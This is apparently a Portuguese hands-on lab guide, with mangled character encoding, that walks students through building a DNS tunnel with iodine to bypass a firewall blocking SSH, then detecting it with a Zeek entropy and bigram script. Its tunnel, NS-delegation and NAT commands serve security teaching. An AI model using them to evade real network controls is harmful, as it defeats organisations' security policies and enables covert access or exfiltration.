## ðŸ”· ContextualizaÃ§Ã£o

![RepresentaÃ§Ã£o da topologia do laboratÃ³rio](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab05-seguranca-dns/images/topologia.png)

Neste laboratÃ³rio, vocÃª irÃ¡ aprender sobre como o tunelamento DNS pode ser utilizado para burlar polÃ­ticas de seguranÃ§a. O laboratÃ³rio Ã© composto por 3 grupos:

1. Rede Corporativa HackInSDN;
2. Rede da Random Company;
3. Rede do tÃºnel DNS.

Sendo que o objetivo Ã© acessar o servidor SSH da Random Company, a partir da rede 1, a qual bloqueia trÃ¡fego SSH por motivos de seguranÃ§a, utilizando a rede 3 para estabecer um tÃºnel DNS que permite o trÃ¡fego SSH.

## ðŸ”· Atividade 1: Teste de acesso ao serviÃ§o SSH

O protocolo SSH (Secure Shell) promove comunicaÃ§Ã£o segura entre um cliente e um servidor. Ele utiliza criptografia para proteger a transmissÃ£o de dados, garantindo que os pacotes de informaÃ§Ã£o sejam enviados de forma segura. O SSH Ã© muito utilizado para gerenciar dispositivos remotos, permitindo que administradores acessem e controlem servidores e outros equipamentos de maneira segura, mesmo em redes nÃ£o confiÃ¡veis.

### ðŸ”¹ Atividade 1.1: Iniciando o serviÃ§o SSH no randomSrv

Inicialmente, o serviÃ§o SSH nÃ£o estÃ¡ ativado, de modo que precisamos habilitÃ¡-lo. Podemos verificar a disponibilidade do serviÃ§o SSH executando o seguinte comando no randomSrv:

```
netstat -tuln | grep :22
```

Que nÃ£o terÃ¡ nenhuma saÃ­da, pois o serviÃ§o SSH nÃ£o estÃ¡ habilitado. Nesse sentido, podemos habilitar o serviÃ§o SSH no servidor da Random Company, utilizando o _service-mnsec-ssh_, aplicaÃ§Ã£o criada para utilizaÃ§Ã£o no dashboard HackInSDN. Para isso, execute os seguintes comandos no host _randomSrv_:

```
#Iniciando o serviÃ§o
service-mnsec-ssh.sh randomSrv --start
#Verificando o status do protocolo SSH
netstat -tuln | grep :22
```

A saÃ­da deve ser a seguinte:

```
root@randomSrv:~# netstat -tuln | grep :22
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
```

Que representa que o aparelho estÃ¡ Ã  escuta de novas conexÃµes na porta 22, o que indica que o serviÃ§o SSH estÃ¡ ativo. ApÃ³s isso, serÃ¡ possÃ­vel acessar remotamente o host _randomsSrv_ atravÃ©s do protocolo SSH.

ApÃ³s iniciar o serviÃ§o SSH, podemos configurar um usuÃ¡rio para permitir o acesso remoto. Para isso, podemos executar o seguinte comando no _randomSrv_:

```
adduser myuser
```

Sendo que serÃ¡ requisitada uma senha e sua confirmaÃ§Ã£o, podendo ser utilizada uma senha simples como "myuserpass", alÃ©m da requisiÃ§Ã£o de outras informaÃ§Ãµes que podem ser deixadas em branco. 

### ðŸ”¹ Atividade 1.2: Tentando acessar o serviÃ§o no h101

ApÃ³s a configuraÃ§Ã£o e inicializaÃ§Ã£o do serviÃ§o SSH, podemos tentar acessÃ¡-lo a partir do h101, executando o seguinte comando:

```
ssh root@192.2.0.2
```

PorÃ©m, inicialmente nÃ£o serÃ¡ observada nenhuma saÃ­da. ApÃ³s alguns minutos, o comando terÃ¡ a seguinte saÃ­da de erro:

```
root@h101:~# ssh myuser@203.0.113.2
ssh: connect to host 203.0.113.2 port 22: Connection timed out
```

Isso ocorre por conta das regras estabelecidas no fw101, as quais liberam trÃ¡fego HTTP, HTTPS, ICMP e DNS, mas bloqueia para outros protocolos, por questÃµes de seguranÃ§a. 

## ðŸ”· Atividade 2: Estabelecimento do tÃºnel DNS

ApÃ³s verificarmos que nÃ£o Ã© possÃ­vel acesar o serviÃ§o SSH a partir do h101, iremos estabelecer um tÃºnel DNS, a partir do qual poderemos permitir trÃ¡fego SSH na Rede Corporativa HackInSDN por meio de requisiÃ§Ãµes DNS. Ao longo dessa atividade, vocÃª irÃ¡ entender sobre como esse processo Ã© estabelecido.

### ðŸ”¹ Atividade 2.1: Iniciando o servidor do tÃºnel no srv201

O _srv201_ irÃ¡ atuar como servidor do tÃºnel DNS, de modo que ele irÃ¡ resolver os nomes de domÃ­nios que serÃ£o criados posteriormente para estabelecimento do tÃºnel. Para iniciar o servidor DNS, primeiro Ã© preciso instalar o iodine, ferramenta a qual serÃ¡ utilizada para estabelecer o tÃºnel. Para isso, podemos executar os seguintes comandos no terminal do Mininet-Sec:

```
apt update && apt install iodine -y
#CriaÃ§Ã£o de diretÃ³rios necessÃ¡rios
mkdir -p /dev/net
mknod /dev/net/tun c 10 200
chmod 666 /dev/net/tun
```

ApÃ³s isso, podemos executar o seguinte comando no host _srv201_:

```
iodined -f -c -P SuperSecretPassword 10.199.199.1/24 t1.teste.ufba.com
```

Sendo que o comando possui os seguintes parÃ¢metros:

1. `iodined`: ParÃ¢metro utilizado para indicar que estamos lidando com o servidor do tÃºnel;
2. `-f`: ParÃ¢metro que faz com que o comando continue sendo executado em primeiro plano;
3. `-P`: ParÃ¢metro para estabelecer a seha a qual serÃ¡ requisitada para iniciar conexÃ£o no tÃºnel;
4. `SuperSecretPassword`: A senha que iremos utilizar para autenticar conexÃ£o ao tÃºnel;
5. `10.199.199.1/24`: MÃ¡scara de rede a partir da qual serÃ£o definidos os endereÃ§os dos hosts no contexto do tÃºnel;
6. `t1.teste.ufba.com`: Nome de domÃ­nio a partir do qual serÃ£o enviados.

De modo que o srv201, como servidor do tÃºnel DNS, passa a esperar requisiÃ§Ãµes do cliente para estabelecer o tÃºnel. 

A saÃ­da do comando deve ser a seguinte:

```
root@srv201:~# iodined -f -c -P SuperSecretPassword 10.199.199.1/24 t1.teste.ufba.com
Opened dns0
Setting IP of dns0 to 10.199.199.1
Setting MTU of dns0 to 1130
Opened IPv4 UDP socket
Listening to dns for domain t1.teste.ufba.com
```

### ðŸ”¹ Atividade 2.2: Iniciando o serviÃ§o Mnsec-Bind9 no fw101

Para estabelecer um tÃºnel DNS, Ã© preciso criar os nomes de domÃ­nios os quais serÃ£o utilizados para comunicaÃ§Ã£o dentro do tÃºnel. Nesse sentido, iremos utilizar o host _fw101_ para criaÃ§Ã£o de nomes de domÃ­nios os quais serÃ£o resolvidos no host _srv201_, de forma que o _h101_ poderÃ¡ se comunicar com o _srv201_ atravÃ©s de requisiÃ§Ãµes DNS, o que permitirÃ¡ estabelecimento do tÃºnel.

Nesse sentido, Ã© preciso permitir comunicaÃ§Ã£o entre processos internos, a partir da permissÃ£o de trÃ¡fego na interface _loopback_ do _fw101_. Esse processo Ã© necessÃ¡rio para viabilizar a resoluÃ§Ã£o de nomes, pois permite que o processo que recebe a requisiÃ§Ã£o DNS possa solicite um roteamento para fazer com a requisiÃ§Ã£o chegue ao destino. Para isso, execute no terminal do _fw101_:

```
iptables -I INPUT -i lo -j ACCEPT
```

ApÃ³s isso, precisamos configurar o processo de resoluÃ§Ã£o de nomes no _fw101_. Para isso, precisamos iniciar o serviÃ§o msec-bind9, que foi criado no contexto do dashboard HackInSDN para permitir a criaÃ§Ã£o de nomes de domÃ­nio nas topologias dos laboratÃ³rios. Para iniciar o serviÃ§o e adicionar um domÃ­nio, devemos executar os seguintes comandos:

```
service-mnsec-bind9.sh fw101 --start
service-mnsec-bind9.sh fw101 --add-zone teste.ufba.com
```

Sendo que o primeiro comando inicia o serviÃ§o msec-bind9, enquanto o segundo adiciona o nome de domÃ­nio teste.ufba.br ao serviÃ§o. 

### ðŸ”¹ Atividade 2.3: CriaÃ§Ã£o de domÃ­nios no fw101 utilizando o serviÃ§o Mnsec-Bind9

ApÃ³s isso, iremos adicionar alguns registros DNS ao nome de domÃ­nio, para permitir a resoluÃ§Ã£o de nomes. Primeiro, iremos adicionar um registro do tipo A, o qual Ã© resolvido diretamente em um endereÃ§o IP, nesse caso, o IP do host _srv201_, permitindo o envio de requisiÃ§Ãµes DNS para ele. Nesse sentido, execute o seguinte comando no host _fw101_:

```
service-mnsec-bind9.sh fw101 --add-entry teste.ufba.com srv201 IN A 203.0.113.2
```

Dessa forma, se um host tentar resolver o nome de domÃ­nio _teste.ufba.br_, a requisiÃ§Ã£o serÃ¡ enviada para o IP do _srv201_.

ApÃ³s isso, definiremos um registro DNS do tipo NS (Name Server), o qual serÃ¡ utilizado para estabelecer o tÃºnel DNS. O registro do tipo NS Ã© associado a um outro nome de domÃ­nio, que pode ter um registro do tipo A, por exemplo, o qual Ã© resolvido por um host que podemos chamar de servidor autoritÃ¡rio. 

Nesse contexto, quando uma requisiÃ§Ã£o Ã© enviada para um nome de domÃ­nio que tem registro do tipo NS, a requisiÃ§Ã£o Ã© enviada para o servidor autoritÃ¡rio, o qual resolve o nome de domÃ­nio associado ao registro NS.

Tendo isso em vista, no tÃºnel DNS, o registro NS serÃ¡ utilizado para estabelecer o tÃºnel e serÃ¡ associado a um nome de domÃ­nio com registro A associado ao IP do host _srv201_, de modo que as requisiÃ§Ãµes para o primeiro, enviadas a partir do _h101_, serÃ£o encaminhadas para o segundo, permitindo comunicaÃ§Ã£o entre o _h101_ e o _srv201_ atravÃ©s de requisiÃ§Ãµes DNS.

Considerando isso, iremos adicionar um registro do tipo NS associado ao registro do tipo A atrelado ao IP do _srv201_, executando o seguinte comando:

```
service-mnsec-bind9.sh fw101 --add-entry teste.ufba.com t1 IN NS srv201
```

ApÃ³s isso, podemos executar alguns comandos no _h101_ para verificar se a resoluÃ§Ã£o de domÃ­nios ocorre corretamente, sendo que:

1. O primeiro comando envia uma requisiÃ§Ã£o para o servidor DNS localizado no fw101 para obter informaÃ§Ãµes sobre o nome de domÃ­nio _teste.ufba.br_;
2. O segundo comando envia uma requisiÃ§Ã£o para o servidor DNS localizado no fw101 para obter informaÃ§Ãµes sobre o nome de domÃ­nio do tipo A _srv201.teste.ufba.br_;
3. O segundo comando envia uma requisiÃ§Ã£o para o servidor DNS localizado no fw101 para obter informaÃ§Ãµes sobre o nome de domÃ­nio do tipo NS _t1.teste.ufba.br_;

Primeiramente, precisamos fazer o _download_ da ferramenta _dnsutils_, a qual inclui a ferramenta _dig_, a qual iremos utilizar para obter informaÃ§Ãµes dos domÃ­nios criados. Para isso, devemos executar os seguintes comandos no terminal do _Mininet-Sec_:

```
apt update && apt install dnsutils -y
```

ApÃ³s isso, vamos configurar o _fw101_ como resolvedor DNS do _h101_, de modo que todas as requisiÃ§Ãµes DNS do segundo sejam enviadas para o primeiro. Para isso devemos executar o seguinte comando no _h101_:

```
echo "nameserver 198.51.100.1" > /etc/resolv.conf
```

De modo que alteramos o arquivo `resolv.conf`, mudando as configuraÃ§Ãµes de resoluÃ§Ã£o DNS do _h101_. 

Tendo feito isso, podemos executar os seguintes comandos no _h101_ para verificar a resoluÃ§Ã£o dos domÃ­nios criados:

```
dig teste.ufba.com
dig srv201.teste.ufba.com A
dig t1.teste.ufba.com NS
```

Ao analisar as saÃ­das desses comandos, serÃ¡ possÃ­vel observar informaÃ§Ãµes sobre os domÃ­nios registrados, sendo que `status: NOERROR` indica que nÃ£o hÃ¡ erros em relaÃ§Ã£o Ã  requisiÃ§Ã£o feita.

**SaÃ­da do primeiro comando**

```
root@h101:~# dig teste.ufba.com

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> teste.ufba.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 11109
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 4a066f993d41339d010000006850378fa11804ed6dc03aae (good)
;; QUESTION SECTION:
;teste.ufba.com.                        IN      A

;; ANSWER SECTION:
teste.ufba.com.         604800  IN      A       127.0.0.1

;; Query time: 0 msec
;; SERVER: 198.51.100.1#53(198.51.100.1) (UDP)
;; WHEN: X Y Z 00:00:00 UTC 2025
;; MSG SIZE  rcvd: 87
```

**SaÃ­da do segundo comando**

```
root@h101:~# dig srv201.teste.ufba.com A

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> srv201.teste.ufba.com A
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 58553
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: c4ab9f288ebb655701000000685037d56b0f4f7c496fc856 (good)
;; QUESTION SECTION:
;srv201.teste.ufba.com.         IN      A

;; ANSWER SECTION:
srv201.teste.ufba.com.  604800  IN      A       203.0.113.2

;; Query time: 4 msec
;; SERVER: 198.51.100.1#53(198.51.100.1) (UDP)
;; WHEN: X Y Z 00:00:00 UTC 2025
;; MSG SIZE  rcvd: 94
```

**SaÃ­da do terceiro comando**

```
root@h101:~# dig  t1.teste.ufba.com NS

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> t1.teste.ufba.com NS
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 35566
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 2bc955ef5b8bc93401000000685037fb3f8f2a61836403ed (good)
;; QUESTION SECTION:
;t1.teste.ufba.com.             IN      NS

;; ANSWER SECTION:
t1.teste.ufba.com.      3114    IN      NS      ns.t1.teste.ufba.com.

;; ADDITIONAL SECTION:
ns.t1.teste.ufba.com.   3114    IN      A       203.0.113.2

;; Query time: 0 msec
;; SERVER: 198.51.100.1#53(198.51.100.1) (UDP)
;; WHEN: X Y Z 00:00:00 UTC 2025
;; MSG SIZE  rcvd: 107
```

### ðŸ”¹ Atividade 2.4: Estabelecimento do tÃºnel

Sabendo que iniciamos o servidor do tÃºnel na atividade 2.1, podemos entÃ£o conectar o cliente, o _h101_, ao tÃºnel, executando o seguinte comando no mesmo:

```
iodine -f -r -P SuperSecretPassword 198.51.100.1 t1.teste.ufba.com
```

O qual possui quase os mesmos parÃ¢metros do comando anterior, e que promove o envio de requisiÃ§Ãµes DNS do _h101_ para o _srv201_, as quais possuem caracterÃ­sticas as quais farÃ£o o _srv201_ iniciar a conexÃ£o do tÃºnel. O parÃ¢metro `-r` Ã© usado para anular o teste de envio de pacotes UDP para o servidor.

ApÃ³s a execuÃ§Ã£o desse comando, o tÃºnel serÃ¡ iniciado, como podemos observar na seguinte saÃ­da do _h101_:

```
root@h101:~# iodine -f -r -P SuperSecretPassword  t1.teste.ufba.com
Opened dns0
Opened IPv4 UDP socket
Sending DNS queries for t1.teste.ufba.com to 198.51.100.1
Autodetecting DNS query type (use -T to override).
Using DNS type NULL queries
Version ok, both using protocol v 0x00000502. You are user #1
Setting IP of dns0 to 10.199.199.3
Setting MTU of dns0 to 1130
Server tunnel IP is 10.199.199.1
Skipping raw mode
Using EDNS0 extension
Switching upstream to codec Base128
Server switched upstream to codec Base128
No alternative downstream codec available, using default (Raw)
Switching to lazy mode for low-latency
Server switched to lazy mode
Autoprobing max downstream fragment size... (skip with -m fragsize)
768 ok.. ...1152 not ok.. ...960 not ok.. 864 ok.. 912 ok.. 936 ok.. ...948 not ok.. will use 936-2=934
Setting downstream fragment size to max 934...
Connection setup complete, transmitting data.
```

ApÃ³s isso, podemos verificar a conectividade no tÃºnel executando o seguinte comando no _srv201_:

```
ping -c 5 10.199.199.2
```

Cuja seguinte saÃ­da indica que o _srv201_ consegue se conectar ao _h101_ atravÃ©s do tÃºnel:

```
root@srv201:~# ping -c 5 10.199.199.2
PING 10.199.199.2 (10.199.199.2) 56(84) bytes of data.
64 bytes from 10.199.199.2: icmp_seq=1 ttl=64 time=2.61 ms
64 bytes from 10.199.199.2: icmp_seq=2 ttl=64 time=3.08 ms
64 bytes from 10.199.199.2: icmp_seq=3 ttl=64 time=3.01 ms
64 bytes from 10.199.199.2: icmp_seq=4 ttl=64 time=3.68 ms
64 bytes from 10.199.199.2: icmp_seq=5 ttl=64 time=2.86 ms

--- 10.199.199.2 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4005ms
rtt min/avg/max/mdev = 2.605/3.045/3.675/0.353 ms
```

AlÃ©m disso, podemos executar o seguinte comando no _h101_ para verificar se ele consegue se conectar ao _srv201_ no contexto do tÃºnel:

```
ping -c 5 10.199.199.1
```

Cuja saÃ­da deve ser a seguinte:

```
root@h101:~# ping -c 5 10.199.199.1
PING 10.199.199.1 (10.199.199.1) 56(84) bytes of data.
64 bytes from 10.199.199.1: icmp_seq=1 ttl=64 time=4.41 ms
64 bytes from 10.199.199.1: icmp_seq=2 ttl=64 time=2.73 ms
64 bytes from 10.199.199.1: icmp_seq=3 ttl=64 time=2.79 ms
64 bytes from 10.199.199.1: icmp_seq=4 ttl=64 time=3.34 ms
64 bytes from 10.199.199.1: icmp_seq=5 ttl=64 time=3.11 ms

--- 10.199.199.1 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 2.734/3.277/4.409/0.607 ms
```

### ðŸ”¹ Atividade 2.5: MudanÃ§as de regras de firewall

Uma vez estabelecido o tÃºnel, podemos enfim utilizÃ¡-lo para fazer com que o _h101_ se conecte ao serviÃ§o SSH do _randomSrv_, atravÃ©s da exfiltraÃ§Ã£o de dados via requisiÃ§Ãµes DNS, processo sobre o qual iremos aprender mais a seguir.

Nesse sentido, o primeiro passo Ã© executar o seguinte comando no _h101_:

```
ip route add 192.2.0.2 via 10.199.199.1
```

Ao executarmos esse comando, adicionamos uma nova regra de roteamento no _h101_, a qual faz com que os pacotes que tenham como destino o _randomSrv_, que possui o IP 192.2.0.2, sejam encaminhados ao IP 10.199.199.1, que corresponde Ã  interface do _srv201_ a qual Ã© utilizada pelo mesmo para se comunicar no tÃºnel.

ApÃ³s isso, vamos executar o seguinte comando no _srv1_, para fazer com que todos os pacotes que saiam pela interface srv201-eth0 tenham seu IP de origem alterado para o IP da interface:

```
iptables -t nat -A POSTROUTING -o srv201-eth0 -j MASQUERADE
```

Isso Ã© Ãºtil pois faz com que os pacotes originados nas interfaces relativas ao tÃºnel em _h101_ ou _srv201_ possam ser encaminhados para outros hosts com o IP legÃ­timo da interface srv201-eth0, o qual estÃ¡ incluÃ­do em regras de roteamento dos outros hosts.

### ðŸ”¹ Atividade 2.6: Conectando o h101 ao serviÃ§o SSH do randomSRV via tÃºnel DNS:

Agora podemos enfim, fazer com que o _h101_ se conecte ao serviÃ§o SSH do _randomSrv_,executando o seguinte comando:

```
ssh myuser@192.2.0.2
```

Comando que serÃ¡ seguido por requisiÃ§Ã£o de confirmaÃ§Ã£o da tentativa de conexÃ£o e requisiÃ§Ã£o da senha anteriormente configurada. ApÃ³s inserirmos as informaÃ§Ãµes requisitadas, teremos a seguinte saÃ­da:

```
root@h101:~# ssh myuser@192.2.0.2
The authenticity of host '192.2.0.2 (192.2.0.2)' can't be established.
RSA key fingerprint is SHA256:RuIL/J6CEZk+NEItUOtCfHnMNkrjqCQx+IbNauC0YNk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.2.0.2' (RSA) to the list of known hosts.
myuser@192.2.0.2's password: 
Linux mininet-sec-d19704818e714b-5b4f94458f-llh7h 5.4.0-172-generic #190-Ubuntu SMP Fri Feb 2 23:24:22 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
myuser@mininet-sec-d19704818e714b-5b4f94458f-llh7h:~$ 
```

Indicando que o acesso ao usuÃ¡rio remoto foi feito com sucesso. Nesse sentido, podemos entender como a comunicaÃ§Ã£o ocorre a partir do seguinte diagrama:

![Diagrama representando as etapas da requisiÃ§Ã£o DNS](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab05-seguranca-dns/images/etapas_requisicao_dns.png)

Sendo que:

1. Etapa 1: Representa o envio da requisiÃ§Ã£o DNS pelo _h101_ no contexto do tÃºnel, contendo a solicitaÃ§Ã£o de acesso ao serviÃ§o SSH do _randomSrv_, para o _fw101_, que foi configurado como resolvedor DNS do _h101_;
2. Etapa 2: Representa o envio da requisiÃ§Ã£o DNS para o _srv201_, configurado para resolver o nome de domÃ­nio usado para estabelecer o tÃºnel, atravÃ©s da conexÃ£o entre o _fw101_ e o _r201_;
3. Etapa 3: ApÃ³s receber a requisiÃ§Ã£o DNS, o _srv201_ a desencapsula, analisa suas informaÃ§Ãµes e verifica a solicitaÃ§Ã£o de acesso ao serviÃ§o SSH do _randomSrv_, e o encaminha para o mesmo, fazendo com que a conexÃ£o de um cliente a um servidor SSH ocorra atravÃ©s de um tÃºnel DNS

ApÃ³s isso, o _randomSrv_ recebe as informaÃ§Ãµes necessÃ¡rias e responde Ã  solicitaÃ§Ã£o do _h101_. Quando a resposta chega ao _srv201_, ela Ã© encapsulada em uma resposta DNS a qual Ã© enviada para o _h101_ no tÃºnel, de forma que este Ãºltimo consegue acessar o serviÃ§o SSH do randomSrv apesar das restriÃ§Ãµes de trÃ¡fego da rede corporativa HackInSDN.

### ðŸ”¹ Atividade 2.7: Encerrando a conexÃ£o ao tÃºnel

ApÃ³s a realizaÃ§Ã£o das atividades, o tÃºnel DNS pode ser encerrado utilizando as teclas `Ctrl+C` nos terminais do _srv201_ e _h101_.

## ðŸ”· Atividade 3: VerificaÃ§Ã£o da criaÃ§Ã£o de logs no Zeek

O objetivo dessa atividade Ã© analisar as informaÃ§Ãµes relativas a domÃ­nios legÃ­timos e a domÃ­nios gerados aleatoriamente no contexto de tÃºneis DNS, visando observar suas diferneÃ§as e como elas podem ser utilizadas na detecÃ§Ã£o de tÃºneis DNS. Para isso, iremos utilizar a ferramenta Zeek, que Ã© um analisador de trÃ¡fego _Open Source_ o qual pode ser usado para monitorar o trÃ¡fego de rede de forma customizada. Nesse sentido, iremos utilizar um script da ferramenta para fazer anÃ¡lises sobre o trÃ¡fego DNS da rede.

### ðŸ”¹ Atividade 3.1: Iniciando o monitoramento de rede

Para executarmos essa etapa, primeiro precisamos verificar a presenÃ§a do script que vamos usar no ambiente, nomeado `dns_lab_script.zeek`. Para isso, podemos executar os seguintes comandos no host _zeek_:

```
#Acessando o diretÃ³rio no qual temos o script
cd scripts/lab-dns/
#Verificando a presenÃ§a do script
ls 
#SaÃ­da: dns_lab_script.zeek
```

ApÃ³s verificarmos a presenÃ§a do script, podemos iniciar o monitoramento de rede utilizando ele. Para isso, Ã© recomendado criar um diretÃ³rio para armazenar os logs que serÃ£o gerados, executando o seguinte comando, ainda no diretÃ³rio `/scripts/lab-dns`:

```
#Criando o diretÃ³rio
mkdir logs_benigno
#Acessando o diretÃ³rio
cd logs_benigno
```

Podemos entÃ£o iniciar o monitoramento pelo host _zeek_:

```
zeek -i br0 ../dns_lab_script.zeek
```

Sendo que estamos monitorando a interface `br0`, que intercepta tanto trÃ¡fego que ocorre entre _zeek_ e _fw101_ quanto entre _zeek_ e _h101_.

### ðŸ”¹ Atividade 3.2: CriaÃ§Ã£o de domÃ­nios no fw101 utilizando o serviÃ§o Mnsec-Bind9

Nessa etapa, iremos registrar nomes de domÃ­nio que representam o comportamento benigno do usuÃ¡rio, visando verificar a diferenÃ§a da anÃ¡lise feita pelo Zeek de um nome comum e um nome gerado aleatoriamente no contexto do tÃºnel DNS, executando os seguintes comandos no _fw101_:


```
service-mnsec-bind9.sh fw101 --add-zone google.com
service-mnsec-bind9.sh fw101 --add-entry google.com news IN A 203.0.113.2
service-mnsec-bind9.sh fw101 --add-zone microsoft.com
service-mnsec-bind9.sh fw101 --add-entry microsoft.com office IN A 203.0.113.2
```

Considerando que o serviÃ§o de registro de domÃ­nios foi iniciado nas etapas anteriores, mas, caso seja preciso inciÃ¡-lo novamente, basta executar o seguinte comando antes dos outros:

```
service-mnsec-bind9.sh fw101 --start
```

> [!IMPORTANT]
> Perceba que estamos utilizando o IP do srv201 para hospedar mais de um nome de domÃ­nio, o que Ã© totalmente possÃ­vel e aplicÃ¡vel na vida real, onde um servidor pode hospedar vÃ¡rios nomes de domÃ­nio. VocÃª conhecia essa possibilidade? Escreva sobre o seu entendimento acerca da relaÃ§Ã£o entre servidores e os domÃ­nios os quais eles podem hospedar.
<textarea name="resposta_dump_manual" rows="6" cols="80" placeholder="Escreva sua resposta aqui..."> </textarea>

### ðŸ”¹ Atividade 3.3: Acesso e anÃ¡lise dos domÃ­nios benignos

Primeiramente, iremos acessar os nomes de domÃ­nio benignos criados anteriormente a partir do _h101_, para que sejam gerados logs sobre essa atividade:

```
dig google.com
dig news.google.com
dig microsoft.com
dig office.microsoft.com
```

Feito isso, podemos verificar os logs gerados, acessando o terminal do _Zeek_ no qual iniciamos o monitoramento. Para isso, apertamos `Ctrl+C` para interromper o monitoramento e digitamos `ls` para verificar os arquivos gerados, e teremos a seguinte saÃ­da:

```
conn.log  dns.log  packet_filter.log  reporter.log  weird.log  wtg_domains_analysis.log
```

O log que temos interesse em analisar Ã© o `wtg_domains_analysis.log`. Nesse sentido, execute `cat wtg_domains_analysis.log` no terminal do _Zeek_ para observar o conteÃºdo do arquivo, que pode se assimilar ao seguinte:

```
#fields ctime   uid     id.orig_h       id.orig_p       id.resp_h       id.resp_p       rquery  entropy score   detection_type
#types  time    string  addr    port    addr    port    string  double  double  string
1750086011.952619       CzD7rvOKZ9EP15IHl       198.51.100.2    48287   198.51.100.1    53      google.com      2.921928        15631.0 DOMAIN_ANALYSIS
1750086011.982602       CE4iVE1TZOfcLB7Dgj      198.51.100.2    39968   198.51.100.1    53      news.google.com 3.323231        18151.0 DOMAIN_ANALYSIS
1750086012.015067       CLkqhv2IVgOVDDnReg      198.51.100.2    50745   198.51.100.1    53      microsoft.com   3.026987        16087.0 DOMAIN_ANALYSIS
1750086012.040061       CTj60rA8cR9qSpIpi       198.51.100.2    57895   198.51.100.1    53      office.microsoft.com    3.284184        18195.0 DOMAIN_ANALYSIS
```

Existem dois parÃ¢metros de interesse no log: entropia (_entropy_) e pontuaÃ§Ã£o (_score_), os quais podem ser usados na detecÃ§Ã£o de tunelamento DNS.

### ðŸ”¹ Entropia, pontuaÃ§Ã£o e seu uso na detecÃ§Ã£o de tunelamento DNS

A entropia Ã© o quÃ£o aleatÃ³rio um determinado dado Ã©, e pode ser calculado a partir da fÃ³rmula de Shannon, representada na figura abaixo. O uso da entropia pode ser importante para detectar tunelamento DNS pelo fato de domÃ­nios gerados aleatoriamente poderem apresentar maiores entropias, devido Ã s suas caracterÃ­sticas anÃ´malas.

![FÃ³rmula de Shannon para cÃ¡lculo de entropia](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab05-seguranca-dns/images/shannons_formula.jpg)

A pontuaÃ§Ã£o pode ser definida como a soma de frequÃªncia de bigramas, sendo que o processo do seu cÃ¡lculo explicado na imagem a seguir:

![Diagrama explicativo sobre cÃ¡lculo de frequÃªncia de bigramas](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab05-seguranca-dns/images/bigramas.png)

Sendo que, nesse caso, os bigramas foram extraÃ­dos da base de dados do site [Alexa](https://www.kaggle.com/datasets/cheedcheed/top1m), o qual possui conjuntos de domÃ­nios populares os quais jÃ¡ foram utilizados em pesquisas relativas Ã  anÃ¡lise de tunelamento DNS. Considerando as diferenÃ§as das estruturas de domÃ­nios legÃ­tmos e domÃ­nios gerados aleatoriamente, a pontuaÃ§Ã£o pode ser um parÃ¢metro de diferenciaÃ§Ã£o entre eles.

Ou seja, para cada nome de domÃ­nio que o Zeek analisa, ele verifica se os bigramas do mesmo estÃ£o contidos no conjunto de bigramas obtidos da base de dados da Alexa e soma os valores associados a ele, gerando a pontuaÃ§Ã£o. Caso o bigrama nÃ£o esteja na base de dados, sua frequÃªncia Ã© dada como zero.

### ðŸ”¹ Atividade 3.4: Acesso e anÃ¡lise dos domÃ­nios aleatÃ³rios

Nessa etapa, analisaremos as informaÃ§Ãµes geradas ao acessar domÃ­nios aleatÃ³rios gerados no tÃºnel DNS, considerando os nomes de domÃ­nios criados anteriormente. Para isso, podemos interromper o monitoramento do _Zeek_ pressionado `Ctrl+C` e criar um novo diretÃ³rio, para que os dados gerados nessa etapa possam ficar armazenados em outro log, permitindo melhor visualizaÃ§Ã£o, executando os seguintes comandos no terminal do _Zeek_:

```
cd ..
mkdir logs_tunel
cd logs_tunel
#Iniciando o monitoramento pelo Zeek
zeek -i br0 ../dns_lab_script.zeek
```

Para verificar as informaÃ§Ãµes relativas aos domÃ­nios gerados aleatoriamente no contexto do tunelamento DNS, podemos iniciar o tÃºnel utilizando os comandos previamente abordados:

Iniciando o servidor do tÃºnel no _srv201_:

```
iodined -f -c -P SuperSecretPassword 10.199.199.1/24 t1.teste.ufba.com
```

Conectando o _h101_ ao tÃºnel:

```
iodine -f -r -P SuperSecretPassword t1.teste.ufba.com
```

ApÃ³s esse acesso, podemos voltar ao terminal do Zeek, parar o monitoramento apertando as teclas `Ctrl+C` e executar `cat wtg_domains_analysis.log` para verificar o conteÃºdo do log que armazena as entropias e pontuaÃ§Ãµes, de modo que o seu conteÃºdo pode se assimilar ao seguinte:

```
#fields ctime   uid     id.orig_h       id.orig_p       id.resp_h       id.resp_p       rquery  entropy score   detection_type
#types  time    string  addr    port    addr    port    string  double  double  string
